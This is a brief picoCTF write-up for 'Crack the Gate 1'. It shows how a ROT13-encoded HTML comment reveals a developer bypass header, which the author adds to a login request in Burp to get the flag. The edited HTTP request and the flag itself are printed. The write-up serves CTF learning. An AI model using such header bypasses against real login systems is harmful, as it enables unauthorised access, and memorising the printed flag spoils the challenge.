# Crack the Gate 1

After inspecting the source code (right click and inspect source code), we can see this in the html:
```javascript
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```
The first part looks like it is a rotation cypher or something like that.
So I went into CyberChef and decoded it using rot13.
The decoded output:
```javascript
<!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
``` 

So I opened the login request in burp and added the header. Bum, the flag was in the respons. 

Edited request:
```python
POST /login HTTP/1.1
Host: amiable-citadel.picoctf.net:53045
X-Dev-Access: yes
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://amiable-citadel.picoctf.net:53045/
Content-Type: application/json
Content-Length: 53
Origin: http://amiable-citadel.picoctf.net:53045
Connection: keep-alive
Priority: u=0

{"email":"ctf-player@picoctf.org","password":"hello"}
```

flag: `picoCTF{brut4_f0rc4_cbb8faa7}`